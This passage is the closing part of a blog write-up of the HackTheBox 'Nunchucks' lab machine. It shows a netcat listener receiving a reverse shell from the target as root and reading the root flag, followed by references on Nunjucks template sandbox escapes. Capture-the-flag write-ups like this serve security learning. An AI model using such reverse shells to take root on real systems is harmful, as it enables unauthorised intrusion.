</span></span></code></pre></div><p>And it worked!</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>â†’ kali@kali Â«nunchucksÂ» Â«10.10.14.46Â» 
</span></span><span class=line><span class=cl>$ nc -nvlp <span class=m>53</span>
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>53</span> ...
</span></span><span class=line><span class=cl>connect to <span class=o>[</span>10.10.14.46<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.11.122<span class=o>]</span> <span class=m>39386</span>
</span></span><span class=line><span class=cl>root@nunchucks:/tmp# id
</span></span><span class=line><span class=cl>id
</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>david<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>david<span class=o>)</span>
</span></span></code></pre></div><p><div class=img-container><img src=imgs/image-20211105233721153.png alt=image-20211105233721153></div></p><p>The flag</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>root@nunchucks:/tmp# cat /root/root.txt
</span></span><span class=line><span class=cl>cat /root/root.txt
</span></span><span class=line><span class=cl>1d2cc...<span class=o>[</span>SNIP<span class=o>]</span>...
</span></span></code></pre></div><div class=post-references><h2>References</h2><ul><li><a href=http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine target=_blank rel="noopener noreferrer">http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine</a></li><li><a href="https://www.youtube.com/watch?v=UqoVQ4dbYaI" target=_blank rel="noopener noreferrer">https://www.youtube.com/watch?v=UqoVQ4dbYaI</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li><li><a href=https://fahmifj.github.io/tags/ffuf/>ffuf</a></li><li><a href=https://fahmifj.github.io/tags/ssti/>SSTI</a></li><li><a href=https://fahmifj.github.io/tags/nunjucks/>Nunjucks</a></li><li><a href=https://fahmifj.github.io/tags/flask/>Flask</a></li><li><a href=https://fahmifj.github.io/tags/linux-capabilities/>Linux-capabilities</a></li><li><a href=https://fahmifj.github.io/tags/perl/>Perl</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Nunchucks on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Nunchucks&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fnunchucks%2f&hashtags=Linux%2cffuf%2cSSTI%2cNunjucks%2cFlask%2cLinux-capabilities%2cPerl"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Nunchucks on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fnunchucks%2f&title=HackTheBox%20-%20Nunchucks&summary=HackTheBox%20-%20Nunchucks&source=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fnunchucks%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Nunchucks on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fnunchucks%2f&title=HackTheBox%20-%20Nunchucks"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Nunchucks on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fnunchucks%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Nunchucks on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Nunchucks%20-%20https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fnunchucks%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Nunchucks on telegram" href="https://telegram.me/share/url?text=HackTheBox%20-%20Nunchucks&url=https%3a%2f%2ffahmifj.github.io%2fhackthebox%2fnunchucks%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;Â·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>